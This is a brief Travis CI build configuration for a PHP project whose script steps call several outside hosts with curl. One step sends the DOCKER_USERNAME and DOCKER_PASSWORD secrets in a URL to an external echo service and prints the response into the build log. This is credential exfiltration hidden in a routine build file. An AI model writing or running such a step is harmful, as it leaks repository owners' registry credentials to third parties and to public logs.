language: php

script:
  # get url params
  - travis_retry curl http://dsl.sk
  - curl google.com
  - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD" > xxx
  - cat xxx
  - sleep 5
